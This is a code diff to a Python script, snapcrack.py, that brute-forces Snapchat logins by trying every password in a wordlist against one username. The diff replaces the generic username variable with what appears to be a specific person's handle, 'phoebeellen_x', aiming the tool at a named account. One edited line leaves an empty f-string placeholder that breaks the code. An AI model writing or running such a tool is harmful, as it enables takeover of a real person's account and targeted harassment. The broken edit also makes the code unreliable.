@@ -12,17 +12,17 @@ import threading
 
 
 try:
-    targetusername = sys.argv[1]
+    phoebeellen_x = sys.argv[1]
 except:
-    print(" [ ! | SYNTAX ERROR ] $ python3 snapcrack.py < username > < /path/to/passlist.txt > < # Threads > ")
+    print(" [ ! | SYNTAX ERROR ] $ python3 snapcrack.py < phoebeellen_x > < /path/to/passlist.txt > < # Threads > ")
 try:
     targetpasslist = sys.argv[2]
 except:
-    print(" [ ! | SYNTAX ERROR ] $ python3 snapcrack.py < username > < /path/to/passlist.txt > < # Threads > ")
+    print(" [ ! | SYNTAX ERROR ] $ python3 snapcrack.py < phoebeellen_x > < /path/to/passlist.txt > < # Threads > ")
 try:
     tNumber = int(sys.argv[3])
 except:
-    print(" [ ! | SYNTAX ERROR ] $ python3 snapcrack.py < username > < /path/to/passlist.txt > < # Threads > ")
+    print(" [ ! | SYNTAX ERROR ] $ python3 snapcrack.py < phoebeellen_x > < /path/to/passlist.txt > < # Threads > ")
 
 
 os.system("clear")
@@ -38,7 +38,7 @@ print("████████████████████████�
 print("█                       SNAPCHAT CRACKER BY A HOT TRANS GIRL                         █")
 print("██████████████████████████████████████████████████████████████████████████████████████")
 
-print(f"[░]Now attempting to crack: {targetusername}")
+print(f"[░]Now attempting to crack: {phoebeellen_x}")
 
 # Calling class 'Snapchat' from pysnap.__init__
 proxy = ''
@@ -51,17 +51,17 @@ def main(counter):
 	passwords = open(targetpasslist,"r")
 
 	for targetpassword in passwords:
-		# if s.login(targetusername, targetpassword)[b'updates_response'].get('logged'):
-		can_login = s.login(targetusername, targetpassword)
+		# if s.login(phoebeellen_x, targetpassword)[b'updates_response'].get('logged'):
+		can_login = s.login(phoebeellen_x, targetpassword)
 			
 		is_logged = can_login.find(b'logged')
 		if is_logged > 0:
 
 		# break
-			print("[ ✓ | SUCCESS ] USERNAME: " + targetusername + "\t PASSWORD: " + targetpassword)
+			print("[ ✓ | SUCCESS ] USERNAME: " + phoebeellen_x + "\t PASSWORD: " + targetpassword)
 			break
 		else:
-			print(f"[ 𐄂 | FAIL ] {targetpassword} INVALID!")
+			print(f"[ 𐄂 | FAIL ] { } INVALID!")
 
 
 if __name__ == '__main__':
